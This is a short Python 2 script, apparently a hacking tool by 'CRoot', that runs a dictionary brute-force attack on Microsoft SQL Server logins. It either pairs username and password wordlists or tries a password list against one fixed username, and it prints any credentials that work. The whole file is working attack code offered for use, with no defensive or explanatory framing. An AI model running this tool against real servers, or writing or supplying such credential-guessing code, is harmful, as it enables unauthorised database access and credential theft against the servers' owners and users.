#!/usr/bin/env python
#coding=utf-8

#-----------------------------------------------
#Author: CRoot
#descript:mssql psaaword burte

import pymssql
import argparse
from colorama import Fore,Style

def chekpassword(ms_server,ms_user,ms_password):
    #connect mssql to check password
    try:
        conn = pymssql.connect(ms_server,ms_user.strip('\n'),ms_password.strip('\n'),'tempdb',charset='UTF-8')
        cur = conn.cursor()
        if not cur:
            return 0
        else:
            return 1
    except Exception as Error:
        return 0
    return 1
def DictAttck(Host,UsernameFile,PasswordFile):
    UserHandle = open(UsernameFile)
    for user in UserHandle:
        PwdHandle = open(PasswordFile)
        for pwd in PwdHandle:
            print Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s"%(user,pwd)
            if chekpassword(Host,user,pwd) == 1:
                print Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" %(user,pwd)
                break

def FixUserAttack(Host,Username,PasswordFile):
    PwdHandle = open(PasswordFile)
    for line in PwdHandle:
        print Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s"%(Username,line)
        if chekpassword(Host,Username,line) == 1:
            print Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" %(Username,line)
            break
def main():
    parser = argparse.ArgumentParser(description='Attack mssql server password by CRoot')
    parser.add_argument('-s',metavar='HostAddr',help='Set host address')
    parser.add_argument('-l',metavar='Username',help='FixUser to attack')
    parser.add_argument('-L',metavar='Username File',help='Use username dictionary to attach')
    parser.add_argument('-P',metavar='Password File',help='Use password dictionary to attach')
    option = parser.parse_args()

    if option.s == None:
        parser.print_help()
        exit(0)

    if option.l != None and option.P != None:
        FixUserAttack(option.s,option.l,option.P)
    elif option.L != None and option.P != None:
        DictAttck(option.s,option.L,option.P)
    else:
        parser.print_help()



if __name__ == '__main__':
    main()
